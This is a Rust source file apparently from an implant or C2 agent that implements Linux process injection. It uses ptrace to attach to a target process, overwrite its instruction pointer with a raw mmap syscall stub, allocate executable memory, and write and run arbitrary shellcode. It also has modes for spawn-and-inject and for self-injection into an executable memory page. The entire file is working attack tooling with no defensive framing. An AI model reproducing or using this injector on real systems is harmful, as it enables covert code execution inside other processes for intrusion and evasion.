// src/agent/injection/linux.rs
#![cfg(target_os = "linux")]

use libc::{
    ptrace, waitpid, user_regs_struct, c_void,
    PTRACE_ATTACH, PTRACE_DETACH, PTRACE_GETREGS, PTRACE_SETREGS,
    PTRACE_CONT, PTRACE_TRACEME, WIFSTOPPED, WSTOPSIG, SIGTRAP, kill,
    mmap, PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANONYMOUS
};
use std::ptr;
use std::mem;
use std::fs::{File, OpenOptions};
use std::os::unix::fs::FileExt;
use std::process::Command;
use std::os::unix::process::CommandExt;

fn read_mem(pid: i32, addr: u64, len: usize) -> Result<Vec<u8>, String> {
    let path = format!("/proc/{}/mem", pid);
    let file = File::open(&path).map_err(|e| e.to_string())?;
    let mut buf = vec![0u8; len];
    file.read_at(&mut buf, addr).map_err(|e| e.to_string())?;
    Ok(buf)
}

fn write_mem(pid: i32, addr: u64, data: &[u8]) -> Result<(), String> {
    let path = format!("/proc/{}/mem", pid);
    let file = OpenOptions::new().read(true).write(true).open(&path).map_err(|e| e.to_string())?;
    file.write_at(data, addr).map_err(|e| e.to_string())?;
    Ok(())
}

unsafe fn perform_injection_logic(pid: i32, shellcode: &[u8]) -> Result<String, String> {
    let mut old_regs: user_regs_struct = mem::zeroed();
    if ptrace(PTRACE_GETREGS, pid, ptr::null_mut::<c_void>(), &mut old_regs as *mut _ as *mut c_void) < 0 {
        return Err("Failed to get regs".to_string());
    }

    #[rustfmt::skip]
    let mmap_stub: [u8; 44] = [
        0x48, 0xc7, 0xc0, 0x09, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc6, 0x00, 0x10, 0x00, 0x00, 
        0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00, 0x49, 0xc7, 0xc2, 0x22, 0x00, 0x00, 0x00, 0x49, 0xc7, 0xc0, 
        0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x0f, 0x05, 0xcc
    ];

    let backup = read_mem(pid, old_regs.rip, mmap_stub.len())?;
    write_mem(pid, old_regs.rip, &mmap_stub)?;

    let mut stub_regs = old_regs;
    stub_regs.rsp -= 256; 
    stub_regs.orig_rax = u64::MAX; 

    ptrace(PTRACE_SETREGS, pid, ptr::null_mut::<c_void>(), &stub_regs as *const _ as *mut c_void);
    ptrace(PTRACE_CONT, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());

    let mut status = 0;
    waitpid(pid, &mut status, 0);
    
    if !WIFSTOPPED(status) || WSTOPSIG(status) != SIGTRAP {
        let _ = write_mem(pid, old_regs.rip, &backup);
        return Err("Stub failed to trap".to_string());
    }

    let mut new_regs: user_regs_struct = mem::zeroed();
    ptrace(PTRACE_GETREGS, pid, ptr::null_mut::<c_void>(), &mut new_regs as *mut _ as *mut c_void);
    let allocated_addr = new_regs.rax;

    if allocated_addr == 0 || allocated_addr > 0x7ffffffff000 {
            let _ = write_mem(pid, old_regs.rip, &backup);
            return Err(format!("mmap failed: 0x{:x}", allocated_addr));
    }

    write_mem(pid, old_regs.rip, &backup)?;
    write_mem(pid, allocated_addr, shellcode)?;

    old_regs.rip = allocated_addr;
    old_regs.orig_rax = u64::MAX;

    ptrace(PTRACE_SETREGS, pid, ptr::null_mut::<c_void>(), &old_regs as *const _ as *mut c_void);
    
    Ok(format!("Injected {} bytes at 0x{:x}", shellcode.len(), allocated_addr))
}

pub unsafe fn inject_remote(pid: u32, shellcode: &[u8]) -> Result<String, String> {
    let pid_i32 = pid as i32;
    if ptrace(PTRACE_ATTACH, pid_i32, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>()) < 0 {
        return Err("Failed to attach".to_string());
    }
    let mut status = 0;
    waitpid(pid_i32, &mut status, 0);
    let res = perform_injection_logic(pid_i32, shellcode);
    ptrace(PTRACE_DETACH, pid_i32, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
    res
}

pub unsafe fn inject_spawn(binary: &str, shellcode: &[u8]) -> Result<String, String> {
    let mut child = Command::new(binary);
    unsafe { child.pre_exec(|| { if ptrace(PTRACE_TRACEME, 0, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>()) < 0 { return Err(std::io::Error::last_os_error()); } Ok(()) }); }
    let child_handle = child.spawn().map_err(|e| e.to_string())?;
    let pid = child_handle.id() as i32;
    let mut status = 0;
    waitpid(pid, &mut status, 0);
    if !WIFSTOPPED(status) {
        let _ = kill(pid, 9);
        return Err("Child did not stop at exec".to_string());
    }
    let res = perform_injection_logic(pid, shellcode);
    ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
    res.map(|s| format!("Spawned PID {} -> {}", pid, s))
}

pub unsafe fn inject_self(shellcode: &[u8]) -> Result<String, String> {
    let ptr = mmap(ptr::null_mut(), shellcode.len(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if ptr == libc::MAP_FAILED { return Err("mmap failed".to_string()); }
    ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());
    let func: extern "C" fn() = mem::transmute(ptr);
    std::thread::spawn(move || { func(); });
    Ok("Self-injection thread spawned".to_string())
}
